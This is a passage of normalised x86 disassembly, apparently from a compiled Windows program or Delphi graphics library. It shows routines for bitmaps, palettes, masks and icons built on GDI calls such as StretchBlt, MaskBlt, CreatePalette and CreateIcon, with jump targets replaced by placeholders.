mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_42545c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4254a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254ad
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4254b0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_42554c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_42545c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4043d4
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425553
lea eax [ ebp - 0x104 ]
call sub_404164
retn
sub_425568
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4256b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425625
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4254b0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4254b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256bd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_4256c8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_4256fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42597c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425558
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425983
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425558
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4257cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406e3c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425983
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425990
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_4259c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402d24
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425a40
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_425a98
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028e8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425b95
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b9c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_425bb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_425c36
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425c48
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028e8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425a40
mov eax esp
call sub_425bb0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425cec
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425a40
mov [ esp ] eax
sub_425d40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4256e8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4256c8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425eec
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425558
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425e12
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425568
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e19
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_42545c
sub_425e19
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4256e8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425558
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425ecc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425568
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ed3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_425f08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_425f98
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407fe4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_42628f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_426081
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_42545c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426088
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426088
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425efc
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407fe4
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42626f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425d40
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407fe4
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_42624c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426253
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_40270c
retn
call sub_4254b0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425efc
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_425f08
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4262a0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425444
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d24
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4256e8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_426384
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4262a0
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_4263f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4262a0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42648d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426494
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4264c4
push ebp
mov ebp esp
add esp 0xffffffac
